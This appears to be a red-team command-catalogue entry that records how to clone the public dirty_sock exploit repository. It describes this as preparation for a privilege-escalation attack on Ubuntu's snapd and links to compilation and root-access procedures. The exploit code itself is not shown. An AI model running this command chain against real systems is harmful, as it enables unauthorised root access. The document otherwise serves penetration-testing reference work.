---
data: 'git clone https://github.com/initstring/dirty_sock.git && cd dirty_sock'
tags:
  - download
  - exploit
type: command
executor: bash
platforms:
  - Linux
id: d3ffd94f-e0ee-423b-b1c6-ac5f21521421
created_at: '2025-12-14T17:30:47.106Z'
updated_at: '2025-12-14T17:30:47.106Z'
verified: false
validated: true
submitted: true
---
# git-clone-dirty-sock

## Command

```bash
git clone https://github.com/initstring/dirty_sock.git && cd dirty_sock
```

## Description

This command clones the dirty_sock exploit repository from GitHub and changes into the directory, preparing the environment for compilation and execution in a privilege escalation attack on Ubuntu's snapd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `git clone` | Clones the repository | Yes |
| `https://github.com/initstring/dirty_sock.git` | URL of the exploit repo | Yes |
| `&& cd dirty_sock` | Chains to directory change | Yes |

## Examples

### Basic Usage

```bash
git clone https://github.com/initstring/dirty_sock.git && cd dirty_sock
```

### Advanced Usage

```bash
git clone https://github.com/initstring/dirty_sock.git dirty_sock_exploit && cd dirty_sock_exploit
```

## Expected Output

Cloning into 'dirty_sock'...
remote: Enumerating objects: X, done.
remote: Total X (delta Y), reused Z (delta W), pack-reused 0
Receiving objects: 100% (X/Y), done.
Then directory change with no output.

## Related

- [[commands/gcc-compile-dirty-sock]]
- [[procedures/Exploit-Dirty-Sock-for-Root-Access]]
